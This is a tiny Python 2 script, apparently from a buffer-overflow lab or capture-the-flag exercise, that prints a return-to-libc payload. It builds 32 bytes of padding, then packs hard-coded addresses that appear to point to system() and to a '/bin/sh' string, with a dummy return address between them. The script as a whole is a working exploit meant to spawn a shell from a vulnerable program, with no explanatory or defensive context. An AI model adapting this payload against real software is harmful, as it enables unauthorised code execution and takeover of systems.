import struct


pad = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"

ret_after_sys = "AAAA"

syss = struct.pack("I",0xb7e64310)
shh = struct.pack("I",0xb7f86d4c)

print pad+syss+ret_after_sys+shh

